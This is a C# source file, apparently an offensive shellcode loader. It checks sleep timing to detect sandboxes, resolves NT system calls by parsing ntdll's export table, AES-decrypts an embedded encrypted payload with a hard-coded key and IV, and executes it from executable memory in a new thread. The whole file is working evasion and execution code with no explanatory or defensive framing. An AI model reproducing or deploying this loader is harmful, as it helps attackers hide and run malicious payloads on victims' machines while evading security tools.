using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace exe
{
    class Program
    {
    	
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds); 
        static void Main(string[] args)
        {
		
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtAllocateVirtualMemory");
            DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;

                pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtCreateThreadEx");
                DELEGATES.NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtCreateThreadEx)) as DELEGATES.NtCreateThreadEx;

                pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWaitForSingleObject");
                DELEGATES.NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWaitForSingleObject)) as DELEGATES.NtWaitForSingleObject;

                string MyKey = "6B-1A-C1-B2-6F-5F-9C-0A-5E-53-03-B0-C6-3C-BA-49-C9-BD-3C-7C-73-BD-82-8C-49-61-53-41-EA-C8-48-B7";
                string Myiv = "AB-F6-96-C2-FE-F7-CB-66-B6-7E-2A-48-3C-EE-61-A5";
                byte[] buf = new byte[1536] {0xda, 0xb9, 0x41, 0x57, 0x2f, 0xed, 0xaf, 0x4d, 0x93, 0xd3, 0x6b, 0x10, 0x17, 0xa7, 0x20, 0x30, 0x42, 0x33, 0x90, 0xbf, 0x6d, 0xbe, 0xd9, 0x13, 0xd3, 0xff, 0xe3, 0x87, 0xbc, 0xb2, 0x52, 0x65, 0x9f, 0xd0, 0x49, 0x2b, 0x0d, 0x8c, 0x89, 0xa5, 0x60, 0xbf, 0x02, 0x85, 0xc2, 0xd9, 0x1a, 0x96, 0xae, 0xe3, 0xae, 0xb2, 0x77, 0xec, 0x51, 0xc9, 0x60, 0x04, 0xff, 0x42, 0xca, 0xfb, 0x42, 0x20, 0xc6, 0xac, 0x4e, 0x5a, 0x27, 0x2d, 0xac, 0x25, 0x17, 0x2d, 0x3a, 0x9d, 0xb8, 0x0c, 0x18, 0x14, 0x54, 0xb4, 0x84, 0xd2, 0x45, 0x54, 0xe7, 0x10, 0x69, 0x75, 0xf1, 0xc8, 0x92, 0x91, 0x4e, 0x45, 0x51, 0xa3, 0x27, 0xf0, 0x31, 0x97, 0x29, 0xbc, 0xaf, 0xe4, 0x93, 0xde, 0xe5, 0x08, 0x5e, 0x57, 0xf4, 0xdc, 0xce, 0xa0, 0xde, 0x16, 0xad, 0x8e, 0xbe, 0xa7, 0x5b, 0xbc, 0x1c, 0x70, 0x38, 0xa7, 0xbb, 0x51, 0xe2, 0x0f, 0xc9, 0xe6, 0x4d, 0x51, 0x94, 0xcf, 0xf6, 0x57, 0x9c, 0x60, 0x2a, 0x80, 0x36, 0xdb, 0x3a, 0x6e, 0x56, 0x61, 0x16, 0xa3, 0xf8, 0xfd, 0x0e, 0x52, 0x8d, 0x7a, 0xa7, 0x36, 0x35, 0xb9, 0xc3, 0xb2, 0x22, 0x71, 0x01, 0x34, 0xce, 0x6e, 0x18, 0x09, 0x8d, 0xa8, 0x91, 0xc1, 0xb7, 0x1e, 0x25, 0xe1, 0xae, 0xb0, 0x9c, 0xf1, 0x08, 0x5d, 0x33, 0xc4, 0x06, 0x79, 0xf2, 0xac, 0xd0, 0xa4, 0xf2, 0x95, 0xe2, 0x8c, 0x97, 0xaa, 0xa6, 0x30, 0x08, 0x4f, 0x8a, 0xb8, 0x82, 0xbe, 0x97, 0x63, 0x70, 0xbf, 0x00, 0x50, 0x2c, 0x9c, 0x83, 0xc6, 0x60, 0x06, 0xb0, 0xc1, 0x19, 0x36, 0xd9, 0x77, 0xbf, 0x28, 0xc8, 0x63, 0x0c, 0x2f, 0xf1, 0x35, 0x82, 0x08, 0x9e, 0x8d, 0x1c, 0x07, 0x4c, 0x42, 0x84, 0x9d, 0x0c, 0x6e, 0xda, 0x31, 0x28, 0xaf, 0xc1, 0x2f, 0x06, 0xa0, 0x4e, 0x51, 0x9f, 0x16, 0xf4, 0xe0, 0xb6, 0xc0, 0xc3, 0x57, 0x74, 0xf7, 0x68, 0x83, 0x6d, 0x5e, 0x70, 0x30, 0x08, 0xc0, 0x7e, 0x8d, 0x93, 0xaa, 0xb5, 0xa6, 0x00, 0x46, 0xed, 0x0b, 0x21, 0xa5, 0x32, 0xe7, 0x2d, 0xef, 0xa5, 0x6c, 0xd9, 0x0e, 0x24, 0xde, 0xec, 0xf9, 0xf2, 0xe7, 0x3a, 0xa4, 0xd5, 0x8d, 0xcf, 0x56, 0xeb, 0x8a, 0x6a, 0x2d, 0x75, 0x17, 0x99, 0xdc, 0x70, 0xc7, 0x17, 0x34, 0xb7, 0xdb, 0xe7, 0x2e, 0x85, 0x10, 0x4d, 0xf7, 0x72, 0x34, 0x52, 0xd7, 0xd1, 0x60, 0x55, 0x9b, 0x28, 0xbe, 0x8b, 0x11, 0xdf, 0x18, 0x9c, 0x90, 0x2f, 0x87, 0x11, 0xad, 0x0d, 0xe7, 0x14, 0xab, 0xd1, 0xbf, 0x91, 0x6e, 0x99, 0x45, 0x34, 0x37, 0x64, 0xb0, 0xc6, 0xec, 0x75, 0x9e, 0x23, 0x3f, 0x48, 0x19, 0xc6, 0xbd, 0x59, 0x00, 0x69, 0x25, 0xc6, 0x3a, 0x50, 0x08, 0x59, 0x48, 0xb4, 0xfd, 0x7f, 0x1f, 0x40, 0x4b, 0x14, 0x43, 0x9f, 0x1c, 0xc4, 0xa4, 0x2f, 0x5e, 0x13, 0xee, 0xa2, 0x3d, 0xef, 0x8c, 0x60, 0xa1, 0x78, 0xd8, 0xfc, 0xf0, 0x08, 0xb6, 0xfe, 0xb5, 0x2c, 0x82, 0x74, 0x87, 0x45, 0x64, 0x17, 0x3f, 0x79, 0x84, 0xa3, 0x65, 0x30, 0x07, 0x6a, 0xe2, 0xc9, 0xab, 0x7e, 0x9a, 0xb6, 0x20, 0x7b, 0xb2, 0x1d, 0xc2, 0xa1, 0xc0, 0xbc, 0xf6, 0x57, 0xc8, 0x93, 0x31, 0xef, 0xa3, 0x72, 0x5a, 0x65, 0xae, 0xe1, 0x24, 0x62, 0x98, 0xba, 0x5d, 0x3e, 0x2e, 0x38, 0xa1, 0xc2, 0x09, 0xc1, 0x70, 0xdb, 0x05, 0x51, 0x1a, 0x61, 0x35, 0x36, 0xa3, 0xe7, 0x3c, 0x57, 0xe7, 0xb2, 0x9a, 0x17, 0xa3, 0x27, 0x8c, 0x03, 0x59, 0x54, 0x7f, 0x85, 0xf2, 0xd5, 0x12, 0x95, 0x14, 0x40, 0xee, 0x95, 0x5a, 0x5d, 0xe1, 0x26, 0x21, 0x86, 0x6a, 0xc7, 0xeb, 0xec, 0x99, 0xad, 0x8a, 0x15, 0x6f, 0x57, 0x30, 0xb5, 0x7f, 0xbf, 0x89, 0x31, 0x81, 0x27, 0x8b, 0xcb, 0x45, 0xab, 0x49, 0x36, 0x40, 0x11, 0xa8, 0xe0, 0xbb, 0x4a, 0x1b, 0x17, 0x2f, 0xad, 0x10, 0xcd, 0x42, 0xa7, 0x29, 0xcc, 0xc5, 0xaa, 0x6c, 0x98, 0x57, 0x07, 0xdb, 0xaf, 0x9a, 0x94, 0x5c, 0x2b, 0x06, 0x03, 0xf7, 0x9d, 0x0f, 0x79, 0x12, 0x2c, 0x25, 0xbb, 0xea, 0x42, 0x2b, 0xbe, 0x0c, 0xe2, 0x10, 0x42, 0x8f, 0x7f, 0x62, 0x84, 0x30, 0x45, 0xa9, 0x53, 0xb1, 0xe9, 0xf4, 0x29, 0xd9, 0x80, 0xde, 0x19, 0x3e, 0xac, 0x92, 0x97, 0x24, 0x6a, 0xba, 0xdc, 0xab, 0xce, 0xef, 0xd6, 0xb3, 0xeb, 0x5a, 0x5d, 0x88, 0x2e, 0x5b, 0x51, 0xdc, 0x0b, 0xcb, 0x13, 0x51, 0xef, 0xa0, 0x34, 0x91, 0x77, 0xfb, 0xff, 0x63, 0x34, 0xda, 0x1b, 0x0b, 0xce, 0x3e, 0x23, 0xe2, 0xc3, 0x97, 0xaf, 0x1f, 0x18, 0x51, 0xfb, 0xaa, 0x36, 0xa5, 0x27, 0xcb, 0x20, 0xad, 0x25, 0xd5, 0x3b, 0x43, 0x69, 0xc3, 0x01, 0xb2, 0x04, 0x67, 0x6b, 0x90, 0xa5, 0xd6, 0x3b, 0x05, 0x3c, 0x93, 0x74, 0xed, 0xaa, 0x12, 0x74, 0x09, 0x2b, 0xf5, 0xc2, 0xcd, 0xf5, 0xeb, 0x5e, 0x8f, 0xc2, 0x5c, 0x09, 0x6a, 0xa2, 0x79, 0xfc, 0xa6, 0x7e, 0x49, 0x84, 0xf2, 0xe3, 0x2e, 0x19, 0x8a, 0x8d, 0x62, 0x11, 0x51, 0xcf, 0xcd, 0xb2, 0x3f, 0x4d, 0xe9, 0xc0, 0x69, 0x5a, 0x97, 0x62, 0xa6, 0xfe, 0x3b, 0x84, 0x09, 0x2b, 0x69, 0xa3, 0xa2, 0x88, 0x69, 0x69, 0x81, 0x68, 0x74, 0xc1, 0x1d, 0x69, 0x9a, 0xb0, 0xef, 0xc3, 0x56, 0x24, 0x7f, 0x24, 0xfe, 0x68, 0xc2, 0xd9, 0xc7, 0x36, 0xb1, 0x63, 0x35, 0xc9, 0xf6, 0xd7, 0xe6, 0x13, 0xf0, 0x9c, 0xd0, 0x9d, 0x2c, 0xbd, 0xfb, 0xc2, 0x18, 0xe9, 0x3b, 0x1d, 0xee, 0xf1, 0x54, 0xcf, 0x0b, 0x83, 0xb2, 0x44, 0x23, 0x3d, 0x96, 0x32, 0x9d, 0x15, 0x84, 0x92, 0xfc, 0xd1, 0x9c, 0xea, 0xd6, 0xa5, 0xee, 0x74, 0x8c, 0x73, 0x17, 0x77, 0xfc, 0x6e, 0x72, 0xb9, 0x40, 0x86, 0x10, 0x23, 0x36, 0xa5, 0x0f, 0x01, 0xbe, 0xad, 0x94, 0x93, 0x6c, 0xc2, 0x1b, 0xda, 0xec, 0xfd, 0xb0, 0xfb, 0x22, 0x54, 0xe9, 0xce, 0xfd, 0x6c, 0x8d, 0x16, 0xdd, 0x66, 0x22, 0x6f, 0x29, 0x79, 0x78, 0x1e, 0xcd, 0xa7, 0xe6, 0x4d, 0xe6, 0x23, 0xb6, 0xd2, 0xbf, 0xc2, 0x87, 0x45, 0x4b, 0xbc, 0x9f, 0xff, 0xa2, 0xd5, 0x04, 0xc6, 0x49, 0x31, 0xe7, 0x63, 0x9e, 0xd5, 0x43, 0xbd, 0xb6, 0x8a, 0xb6, 0x44, 0x07, 0x45, 0x78, 0xc9, 0x7c, 0x1c, 0x17, 0x67, 0xad, 0xce, 0xcd, 0x4f, 0xbf, 0x88, 0x1e, 0x61, 0x37, 0x43, 0xc8, 0xf0, 0x61, 0x5d, 0xce, 0xcd, 0x69, 0x89, 0x13, 0x13, 0x56, 0xe6, 0x10, 0xb4, 0x31, 0xd9, 0x42, 0x6b, 0x7b, 0x4b, 0xb3, 0x14, 0x23, 0x73, 0x74, 0x2a, 0x23, 0xaa, 0xdf, 0xf5, 0xd2, 0x39, 0xdc, 0xec, 0xcc, 0x35, 0xaf, 0x4d, 0x0a, 0x59, 0xea, 0x28, 0xd6, 0xd7, 0xd8, 0x2e, 0xad, 0xba, 0x47, 0xdc, 0xd9, 0xb4, 0x64, 0xda, 0xa1, 0x84, 0xd1, 0x10, 0x0c, 0x00, 0x9b, 0x9d, 0x27, 0xb1, 0xb6, 0x54, 0xcf, 0x4a, 0x63, 0x6b, 0xf7, 0x80, 0x3a, 0x7b, 0x36, 0xc2, 0xc0, 0xbd, 0x3c, 0xec, 0xc9, 0x3e, 0x78, 0x92, 0x15, 0x84, 0x19, 0x42, 0x4c, 0x92, 0xba, 0x61, 0x27, 0x41, 0x9c, 0x74, 0x6b, 0x26, 0x90, 0x38, 0xc3, 0x43, 0x40, 0x53, 0x7b, 0x9d, 0xc7, 0x1b, 0xd9, 0x7d, 0x07, 0xf8, 0x86, 0x65, 0x5d, 0x99, 0x46, 0x4c, 0xc8, 0x84, 0xd7, 0xf0, 0x86, 0x3c, 0x1f, 0x66, 0x5f, 0xac, 0x12, 0xbf, 0x1d, 0x5b, 0xfa, 0x31, 0x3a, 0xd6, 0xf1, 0xd6, 0xc2, 0xa7, 0x2c, 0xff, 0x59, 0x9c, 0x00, 0x11, 0xac, 0x13, 0x55, 0x0c, 0x42, 0xdc, 0x34, 0xea, 0xd2, 0xdc, 0xbc, 0xb1, 0xc6, 0x42, 0x50, 0x5d, 0xf3, 0x65, 0x95, 0x52, 0x15, 0xb6, 0xa0, 0x21, 0x52, 0x9d, 0x1d, 0xcb, 0xd5, 0xe3, 0x9a, 0x75, 0x41, 0x54, 0x25, 0x75, 0x83, 0xa8, 0xa5, 0x81, 0x9c, 0xa5, 0x19, 0x38, 0x85, 0xe9, 0x9c, 0xaa, 0x6a, 0x41, 0x4a, 0x71, 0x33, 0xba, 0x22, 0xd8, 0x6e, 0x9c, 0xd9, 0x3f, 0x13, 0x48, 0x57, 0xba, 0xad, 0x60, 0xad, 0x82, 0x0b, 0xd6, 0x0a, 0x90, 0xc0, 0xd0, 0x1e, 0xe8, 0x92, 0xa3, 0xd2, 0xbd, 0x9c, 0xb9, 0x6a, 0x02, 0xe6, 0xb8, 0xf3, 0x2b, 0xdc, 0xea, 0x69, 0xc8, 0x0d, 0xae, 0x14, 0x5c, 0x6f, 0x54, 0xd9, 0xff, 0x3b, 0xa9, 0x8f, 0x92, 0x0f, 0x0f, 0x86, 0x9b, 0x31, 0x6a, 0x44, 0xb1, 0xac, 0xc8, 0x7d, 0xee, 0xe3, 0x80, 0x2e, 0xe3, 0x72, 0xcf, 0x65, 0xfe, 0x00, 0xcc, 0xe4, 0xe7, 0x2b, 0xe6, 0xfd, 0x27, 0xe6, 0x9b, 0x5e, 0x18, 0xa0, 0x6e, 0x96, 0x0d, 0x54, 0x99, 0x7a, 0x0d, 0xc6, 0x9a, 0x68, 0xd8, 0x17, 0x05, 0x49, 0x38, 0x52, 0x58, 0x2e, 0x75, 0x0b, 0xda, 0x5c, 0x11, 0xe3, 0x49, 0x6f, 0x85, 0x2e, 0xfc, 0xee, 0x99, 0x63, 0xc1, 0x2d, 0x32, 0x5b, 0x72, 0xeb, 0x5e, 0xbd, 0xac, 0x81, 0x5c, 0x2f, 0x70, 0xca, 0x43, 0x46, 0xf2, 0xb7, 0x80, 0xa7, 0x6f, 0x85, 0x32, 0xcd, 0x61, 0x08, 0x34, 0x8c, 0x4b, 0xa1, 0x16, 0xab, 0x6b, 0xf7, 0xb5, 0x59, 0x72, 0xc5, 0xee, 0xd6, 0x36, 0xc0, 0x46, 0x2b, 0x0a, 0x35, 0x3b, 0x90, 0x8b, 0x96, 0xb5, 0x60, 0xb3, 0x7a, 0xb3, 0x67, 0xf6, 0x94, 0xe4, 0x17, 0x7e, 0x22, 0x34, 0xdd, 0xf1, 0xce, 0x3a, 0xc2, 0xbc, 0x89, 0xef, 0xe2, 0x8c, 0x74, 0x46, 0x1d, 0xed, 0xd6, 0x83, 0x3d, 0xbb, 0x4a, 0x5c, 0xa7, 0x4a, 0x0c, 0xbb, 0x2c, 0x3b, 0xb1, 0xde, 0xa6, 0x79, 0xbb, 0xcd, 0x91, 0xa0, 0x99, 0x48, 0xee, 0xa3, 0x32, 0x87, 0xaa, 0xd0, 0x51, 0x05, 0x79, 0x65, 0x11, 0x72, 0x56, 0x71, 0x67, 0xb6, 0x32, 0xfb, 0x40, 0xba, 0x90, 0x9e, 0x47, 0x95, 0xd0, 0xa7, 0xc1, 0xc0, 0xcb, 0xa1, 0xbe, 0xb4, 0x5c, 0x87, 0x1f, 0x48, 0x08, 0xe9, 0xdf, 0x52, 0x6a, 0xfb, 0x72, 0x0c, 0x52, 0x71, 0x7d, 0x31, 0x64, 0x71, 0x0c, 0xb0, 0xa5, 0x52, 0x73, 0xe9, 0x5c, 0x05, 0xdf, 0x77, 0x24, 0x05, 0x4a, 0xa0, 0x06, 0x62, 0x1f, 0x2e, 0xb8, 0x84, 0xe2, 0x61, 0x39, 0x00, 0xc5, 0x7c, 0xb2, 0xb2, 0x72, 0xaa, 0x99, 0xd9, 0x76, 0x4a, 0x84, 0xf2, 0x05, 0xc2, 0x0c, 0x07, 0x14, 0xfe, 0xee, 0xfb, 0x5e, 0xa6, 0x8f, 0xec, 0xe1, 0x3b, 0xce, 0x77, 0x22, 0x00, 0xf4, 0xb8, 0x4e, 0xc5, 0x64, 0x4b, 0xb9, 0x1f, 0x31, 0xd5, 0x9f, 0xc6, 0x2a, 0xc3, 0x4e, 0xe9, 0x15, 0x63, 0x83, 0xb5, 0x75, 0x12, 0x53, 0x6f, 0x58, 0xcc, 0xd3, 0x04, 0x1c, 0x1d, 0x7a, 0xbc, 0xde, 0x40, 0x8e, 0x61, 0x22, 0x0c, 0x77, 0x4c, 0xcd, 0xd3, 0xd2, 0x56, 0x81, 0x91, 0x9c, 0xee, 0xb1, 0x31, 0x8a, 0x45, 0xd2, 0x40, 0x1a, 0x0b, 0x17, 0x05, 0xa0, 0xa7, 0xc4, 0x65, 0x59, 0x9d, 0x3e, 0x83, 0x08, 0x0b, 0x15, 0x1c, 0x8f, 0xfe, 0xa6, 0x51, 0xe5, 0xb0, 0xf1, 0x36, 0x08, 0xad, 0x56, 0xde, 0xf2, 0xb2, 0xe5, 0x02, 0xbd, 0xc2, 0xec, 0x6e, 0x72, 0x91, 0xe6, 0x5d, 0xeb, 0x28, 0xd7, 0x29, 0x59, 0xf8, 0x39, 0x19, 0x25, 0x3d, 0x4d, 0x5d, 0xf2, 0xcd, 0x80, 0x9e, 0x9a, 0xab, 0x09, 0x1c, 0xfa, 0xd3, 0x2c, 0x1c, 0xc3, 0xba, 0x4b, 0x85, 0x04, 0xe0, 0x72, 0xee, 0xca, 0xd5, 0xd0, 0xa6, 0x42, 0xd2, 0x68, 0xb6, 0xfa, 0xd8, 0xac, 0x57, 0xa7, 0x4e, 0x3e, 0x8d, 0x3f};
                //Convert key to bytes
                string[] c1 = MyKey.Split('-');
                byte[] f = new byte[c1.Length];
                for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
                //Convert IV to bytes
                string[] d1 = Myiv.Split('-');
                byte[] g = new byte[d1.Length];
                for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
                string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
                // Remove dashes from string
                string[] roundnodash = roundtrip.Split('-');
                // Convert Decrypted shellcode back to bytes
                byte[] e = new byte[roundnodash.Length];
                for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

                IntPtr hCurrentProcess = GetCurrentProcess();
                IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
                IntPtr pZeroBits = IntPtr.Zero;
                IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(e.Length)); // needs to be passed as ref
                uint allocationType = 0x3000;
                uint protection = 0x00000040;
                NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
                Marshal.Copy(e, 0, pMemoryAllocation, e.Length);

                IntPtr hThread = new IntPtr(0);
                STRUCTS.ACCESS_MASK desiredAccess = STRUCTS.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | STRUCTS.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
                IntPtr pObjectAttributes = new IntPtr(0);
                IntPtr lpParameter = new IntPtr(0);
                bool bCreateSuspended = false;
                int stackZeroBits = 0;
                int sizeOfStackCommit = 0xFFFF;
                int sizeOfStackReserve = 0xFFFF;
                IntPtr pBytesBuffer = new IntPtr(0);

                NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
                NtWaitForSingleObject(hThread, false, 0); 
        }
	
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                    throw new ArgumentNullException("Key");
                if (IV == null || IV.Length <= 0)
                    throw new ArgumentNullException("IV");
                string plaintext = null;
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = Key;
                    aesAlg.IV = IV;
                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
        }
            
    }
    
    public class DELEGATES
    {
        //standalone delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateThreadEx(out IntPtr threadHandle, STRUCTS.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWaitForSingleObject(IntPtr ProcessHandle, Boolean Alertable, int TimeOut);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
    }
    public class STRUCTS
    {
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,
            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };
    }
    public class Invoke
    {
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }
            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
    }
}
